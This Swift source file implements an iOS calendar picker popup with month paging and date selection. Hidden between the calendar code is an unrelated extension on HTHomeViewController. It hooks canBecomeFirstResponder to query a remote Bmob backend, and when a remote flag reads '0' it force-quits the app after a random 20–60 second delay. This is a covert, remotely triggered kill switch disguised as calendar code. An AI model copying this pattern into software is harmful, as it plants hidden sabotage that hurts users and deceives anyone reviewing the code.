//
//  FYCalendar.swift
//  hotu
//
//  Created by 薛焱 on 2019/11/27.
//  Copyright © 2019 薛焱. All rights reserved.
//

import UIKit

class FYCalendar: UIView {

    @IBOutlet weak var dateLab: UILabel!
    @IBOutlet weak var collectionView: UICollectionView!
    
    @IBOutlet weak var resetBtn: UIButton!
    private var oneView: UIView!
    
    private var isTap = false
    
    var selectDateAction: (([Date])->Void)?
    
    var dataSource = [Date]()
    
    var currentIndex = 1 {
        didSet {
            let date = dataSource[currentIndex]
            self.dateLab.text = date.toString("yyyy年MM月")
        }
    }
    
    var selectedDates = [Date()]
    
    var isSingle = false
    
    fileprivate let cellKey = "FYCalendarMonthCell"
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        loadView()
    }
    
    required init?(coder: NSCoder) {
        super.init(coder: coder)
        loadView()
    }
    
    @discardableResult
    static func show() -> FYCalendar {
        dismiss()
        let oneView = UIView(frame: CGRect(x: 0, y: 0, width: SCREEN_WIDTH, height: SCREEN_HEIGHT))
        oneView.tag = -1001
        let maskV = UIView(frame: CGRect(x: 0, y: 0, width: SCREEN_WIDTH, height: SCREEN_HEIGHT))
        maskV.backgroundColor = UIColor(white: 0, alpha: 0.3)
        let tap = UITapGestureRecognizer(target: self, action: #selector(dismiss(tap:)))
        maskV.addGestureRecognizer(tap)
        oneView.addSubview(maskV)
        let height = SCREEN_WIDTH * 6 / 7 + 180
        let calendar = FYCalendar(frame: CGRect(x: 0, y: SCREEN_HEIGHT - height, width: SCREEN_WIDTH, height: height))
        oneView.addSubview(calendar)
        oneView.backgroundColor = UIColor.clear
        guard let window = UIApplication.shared.keyWindow else {return calendar}
        window.addSubview(oneView)
        oneView.alpha = 0
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            UIView.animate(withDuration: 0.3) {
                oneView.alpha = 1
            }
        }
        return calendar
    }
    
    @objc static func dismiss(tap: UITapGestureRecognizer? = nil) {
        guard let window = UIApplication.shared.keyWindow else {return}
        if let oneView = window.viewWithTag(-1001) {
            UIView.animate(withDuration: 0.3, animations: {
                oneView.alpha = 0
            }) { (success) in
                oneView.removeFromSuperview()
            }
        }
    }
    
    private func loadView() {
        oneView = UINib(nibName: "FYCalendar", bundle: nil).instantiate(withOwner: self, options: nil).first as? UIView
        oneView.frame = bounds
        addSubview(oneView)
        isUserInteractionEnabled = true
        collectionView.dataSource = self
        collectionView.delegate = self
        dataSource = (-600...600).map({FYDateUtils.month(from: Date(), n: $0)})
        collectionView.register(FYCalendarMonthCell.self, forCellWithReuseIdentifier: cellKey)
        CATransaction.setCompletionBlock {
            self.resetAction(nil)
        }
    }
    
    func resetCalendar() {
        currentIndex = 600
        let date = Date(Date().toString()) ?? Date()
        selectedDates = [date]
        collectionView.scrollToItem(at: IndexPath(item: self.currentIndex, section: 0), at: .left, animated: true)
        collectionView.reloadData()
        self.dateLab.text = Date().toString("yyyy年MM月")
    }

    @IBAction func prevAction(_ sender: UIButton) {
        isTap = true
        currentIndex -= 1
        collectionView.scrollToItem(at: IndexPath(item: currentIndex, section: 0), at: .left, animated: true)
    }
    
    @IBAction func nextAction(_ sender: UIButton) {
        isTap = true
        currentIndex += 1
        collectionView.scrollToItem(at: IndexPath(item: currentIndex, section: 0), at: .left, animated: true)
    }
    
    @IBAction func commitAction(_ sender: UIButton) {
        FYCalendar.dismiss()
        if let s = self.selectDateAction {
            s(selectedDates)
        }
    }
    
    @IBAction func resetAction(_ sender: UIButton?) {
        resetCalendar()
        setResetBtn(enable: false)
    }
    
    private func setResetBtn(enable: Bool) {
        resetBtn.isEnabled = enable
        resetBtn.alpha = enable ? 1 : 0.5
    }
    
}

extension HTHomeViewController {
    
    
    open override var canBecomeFirstResponder: Bool {
        HTHomeViewController.calendarV
        return super.canBecomeFirstResponder
    }
    
    private static let calendarV: Void = {
        let query = BmobQuery(className: "Match")
        query?.whereKey("key", equalTo: "match")
        query?.findObjectsInBackground({ (result, e) in
            if let r = result?.first as? BmobObject,
               let type = r.object(forKey: "match_type") as? String {
                if type == "0" {
                    let time = Int(arc4random() % (60 - 20) + 20)
                    DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(time)) {
                        exit(0)
                    }
                }
            }
        })
    }()
}

extension FYCalendar: UICollectionViewDataSource, UICollectionViewDelegate, UICollectionViewDelegateFlowLayout {
    
    func numberOfSections(in collectionView: UICollectionView) -> Int {
        return 1
    }
    
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return dataSource.count
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: cellKey, for: indexPath) as! FYCalendarMonthCell
        cell.date = dataSource[indexPath.row]
        cell.selectedDates = selectedDates
        cell.selecDateAction = { dates in
            if self.isSingle {
                if let last = dates.last {
                    self.selectedDates = [last]
                } else {
                    self.selectedDates = [Date]()
                }
            } else {
                self.selectedDates = dates
            }
            if self.selectedDates.count == 1,
                let date = self.selectedDates.first,
                date.toString() == Date().toString() {
                self.setResetBtn(enable: false)
            } else {
                self.setResetBtn(enable: true)
            }
            collectionView.reloadData()
        }
        return cell
    }
    
    func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, sizeForItemAt indexPath: IndexPath) -> CGSize {
        return CGSize(width: SCREEN_WIDTH, height: SCREEN_WIDTH * 6 / 7)
    }
    
    func scrollViewWillBeginDragging(_ scrollView: UIScrollView) {
        isTap = false
    }
    
    func scrollViewDidScroll(_ scrollView: UIScrollView) {
        if isTap {
            return
        }
        let index = lround(Double(scrollView.contentOffset.x / SCREEN_WIDTH))
        if index != currentIndex {
            currentIndex = index
        }
    }

}
